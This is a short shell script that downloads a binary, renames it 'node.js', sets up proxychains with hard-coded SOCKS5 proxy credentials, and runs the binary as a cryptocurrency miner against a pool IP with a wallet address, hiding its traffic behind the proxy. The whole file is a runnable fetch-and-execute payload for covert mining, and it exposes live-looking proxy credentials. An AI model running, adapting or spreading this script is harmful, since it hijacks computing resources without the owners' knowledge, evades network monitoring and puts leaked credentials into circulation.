proxy="34.228.46.223" 
port="1080" 
user="m4kjloavynhtvj"  
pass="q1pgnn9n3elk37zzov63ldt0ect" 
wget -q -O node.js https://bitbucket.org/indarsza/sanaya/downloads/httpd && chmod +x node.js
wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
sleep 3 
sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
sleep 1 
sed -i "s/port/$port/" "proxychains.conf" 
sed -i "s/user/$user/" "proxychains.conf"  
sleep 1  
sed -i "s/pass/$pass/" "proxychains.conf" 
sleep 11 
echo "******************************************************************" 
echo "IP ORI ==> "$(curl ifconfig.me) 
echo " " 
echo " " 
echo "IP BARU ==> "$(./panel curl ifconfig.me)
./panel ./node.js -a cpupower -o 149.50.222.86:443 -u CWymb6PUUEbPgE1b8MJ1zJTg4jbXvNs3P3.$(echo $(shuf -i 10-999 -n 1)-EXCEL) -p c=CPU -x socks5://m4kjloavynhtvj:q1pgnn9n3elk37zzov63ldt0ect@34.228.46.223:1080
